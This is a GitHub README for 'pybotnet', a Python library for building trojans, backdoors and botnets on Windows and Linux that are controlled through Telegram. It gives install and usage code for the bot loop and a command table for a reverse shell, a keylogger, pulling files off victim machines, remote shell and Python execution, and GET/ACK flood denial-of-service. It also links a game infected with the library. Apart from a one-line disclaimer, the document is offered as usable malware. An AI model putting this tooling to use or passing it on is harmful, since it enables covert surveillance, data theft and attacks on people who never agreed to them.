 
 <p align="center">
  <a href='https://github.com/onionj/pybotnet' target='_blank'><img src='https://files.virgool.io/upload/users/271869/posts/wxs2bk9hkqfx/ezoxwssoikqm.jpeg' border='5' alt='trojan horse'/></a>  <h1 align="center">pybotnet</h1>
  <p align="center"> A Python Library for building <b>botnet</b> , <b>trojan</b>  or <b>backdoor</b> for windows and linux with Telegram control panel </p>

  <p align="center">
    <a href="https://github.com/onionj/pybotnet">
      <img src="https://img.shields.io/pypi/v/pybotnet?label=pybotnet" />
    </a>
    <a href="https://github.com/onionj/pybotnet/blob/master/LICENSE">
      <img src="https://img.shields.io/github/license/onionj/pybotnet" />
    </a>
    <a href="https://www.python.org/">
    	<img src="https://img.shields.io/pypi/pyversions/pybotnet" />
    </a>
  </p>
</p>
 
> Disclaimer: Please note that this is a research project. I am by no means responsible for any usage of this tool. Use it on your behalf. 


> [Persian document](https://vrgl.ir/G2i6b)  داکیومنت فارسی


### Features:
* Telegram anti-filter control panel
* reverse shell
* keylogger
* extract target info 
* sleep source by Optional message
* export file/s to target's system
* import file/s from target's system 
* screenshot
* Task Scheduler
* Website Opener
* Sound Player
* Denial-Of-Service Attacker
* Python Code runner

for more, see commands table at the end of this page 



#### Requirements:

* Python 3.6 or higher
* Telegram account

### Usage:
```
pip install pybotnet
```

```python

from pybotnet import pybotnet
import time

# change TELEGRAM_TOKEN and  ADMIN_CHAT_ID to valid data:

# telegram api token (Get it from the telegram @botfather)
TELEGRAM_TOKEN = '1468299547:ABHs_________MzZcYxF_e00000000000'

# telegram account number ID (get it from @userinfobot)
ADMIN_CHAT_ID = '12345678910'



# * show_log:          just for debugging
# * send_system_data:  send system short info in every bot messages in telegram

bot = pybotnet.PyBotNet(TELEGRAM_TOKEN, ADMIN_CHAT_ID,
                        show_log=True, send_system_data=True)

delay = 7

while True:
    print('*-*'*15)
    bot.get_and_execute_scripts_by_third_party_proxy()
    time.sleep(delay)

```

### Commmands:

> Send the desired command to your bot in telegram, using the admin account registered in the trojan.

>  to run a command on only one target, use :  `<Target_MAC_Address> <command>` ,Example:  `66619484755211 get_info` 


COMMAND | Sample | DOES THIS | version | tested on |
--------|--------|---------|--------------------------|-----------|
`get_info` | `get_info` | returns system info | 0.06 | windows, linux |
`do_sleep <scconds> <message (Optional)>` | `do_sleep 99999 hi, i see you!` | Sleeps with printing a message. | 0.08 | windows, linux |
`cmd <system command>` | `cmd mkdir new_folder` `cmd cd ..`, `cmd ls` | runs system commands in shell or cmd | 0.07 | windows, linux|
`export_file <link>` | `export_file https://github.com/onionj/pybotnet/archive/refs/heads/master.zip` | file will be exported on the target machine and saved to the script path | 0.14 | windows, linux|
`import_file <file_route>` |`import_file /home/onionj/folder/somting.png` | imports a file from target system (limit:5GB & 20min)| 0.17.0 |  windows, linux|
`screenshot` | `screenshot` | Takes a screenshot, uploads it to the online server and returns the download link | 0.18.1 |  windows, linux |
`help` | `help` | sends help menu | 0.18.5 | windows, linux |
`/start` | `/start` | runs `help` command !! | 0.18.7 | windows, linux |
`<MAC_Address> reverse_shell` or `reverse_shell`| `66619484755211 reverse_shell` and `exit` for exit!| starst reverse shell on the target machine | 0.20.1 | windows, linux |
`keylogger` | `keylogger start` and `keylogger stop` to stop the keylogger | Starts a keylogger on victim's system. *keylogger can't handle persian words very correctly* | 0.21.1 | windows, linux 
`scheduler` | `scheduler start ,stop , list` | Adds a schedule to be run each n second | 0.25.3 | windows, linux
`playsound` | `playsound <sound-name>` | Will play a sound. Playsound can only play MP3 or WAV Files. | 0.25.3 | windows, linux
`openurl` | `openurl <url> <how-many-times>` | Will open a url n times. | 0.25.3 | windows, linux
`dos` | `dos <attack-type [GETFlood-ACKFlood]> <target-ip> <target-port> <thread-number> <payload-size>` | Will run Denial-Of-Service Attack. | 1.0.0 | windows
`runcode` | `runcode <code>` | Will run python code, The code should be written in a seperate line with correct python syntax, Because of python limitations , The function can't return the results. | 1.0.0 | windows, Linux
> If you like this repo and find it useful, please consider ★ starring it (on top right of the page) and forking it :)

> [TODO List](https://github.com/onionj/pybotnet/blob/master/TODOLIST.MD)

> Sample GUI Trojan created by pybotnet: [VINET](https://github.com/onionj/vinet)

> Infected Game With PyBotNet: [Infected Game With PyBotNet](https://github.com/SepehrRasouli/SimpleAndShortPrograms/tree/main/Infected%20game%20With%20PyBotNet)


## Contributors ✨
Thanks goes to these wonderful people :

<table>
<td align="center"><a href="https://github.com/onionj"><img src="https://avatars.githubusercontent.com/u/77416478?v=4" width="70px;" alt=""/><br /><sub><b>oNion</b></sub></a><br /></td>
<td align="center"><a href="https://github.com/TorhamDev"><img src="https://avatars.githubusercontent.com/u/87639984?v=4" width="70px;" alt=""/><br /><sub><b> TorhamDev</b></sub></a><br /></td>
<td align="center"><a href="https://github.com/SepehrRasouli"><img src="https://avatars.githubusercontent.com/u/81516241?v=4" width="70px;" alt=""/><br /><sub><b> SepehrRasouli</b></sub></a><br /></td>
</table>
